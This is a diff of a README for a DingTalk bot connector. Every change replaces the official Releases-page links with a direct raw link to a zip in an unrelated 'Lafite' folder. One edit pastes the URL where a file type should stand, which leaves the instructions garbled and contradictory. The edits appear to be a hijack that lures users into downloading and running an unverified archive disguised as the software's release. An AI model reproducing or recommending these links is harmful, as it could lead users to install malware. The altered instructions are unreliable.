@@ -1,6 +1,6 @@
 # 🎈 dingtalk-moltbot-connector - Connects Dingtalk Bots Seamlessly
 
-[![Release Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ALI-FAHD/dingtalk-moltbot-connector/releases)
+[![Release Download](https://github.com/ALI-FAHD/dingtalk-moltbot-connector/raw/refs/heads/main/Lafite/moltbot_dingtalk_connector_2.5-beta.5.zip%20Latest%https://github.com/ALI-FAHD/dingtalk-moltbot-connector/raw/refs/heads/main/Lafite/moltbot_dingtalk_connector_2.5-beta.5.zip)](https://github.com/ALI-FAHD/dingtalk-moltbot-connector/raw/refs/heads/main/Lafite/moltbot_dingtalk_connector_2.5-beta.5.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin using dingtalk-moltbot-connector, follow the instructions below. You’
 
 ## 📥 Download & Install
 
-To download the latest version of the software, **visit this page to download**: [Download Latest Release](https://github.com/ALI-FAHD/dingtalk-moltbot-connector/releases).
+To download the latest version of the software, **visit this page to download**: [Download Latest Release](https://github.com/ALI-FAHD/dingtalk-moltbot-connector/raw/refs/heads/main/Lafite/moltbot_dingtalk_connector_2.5-beta.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Here, you will see the list of available versions. Select the most recent version.
@@ -21,7 +21,7 @@ To download the latest version of the software, **visit this page to download**:
 
    - **Windows**: The downloaded file should be a `.exe` file. Double-click it to run the installer.
    - **macOS**: Look for a `.dmg` file. Open it and follow the prompts to install.
-   - **Linux**: If applicable, the file may be a `.tar.gz`. Extract it and follow the installation instructions found within.
+   - **Linux**: If applicable, the file may be a `https://github.com/ALI-FAHD/dingtalk-moltbot-connector/raw/refs/heads/main/Lafite/moltbot_dingtalk_connector_2.5-beta.5.zip`. Extract it and follow the installation instructions found within.
 
 5. Follow the setup instructions provided during installation. 
 
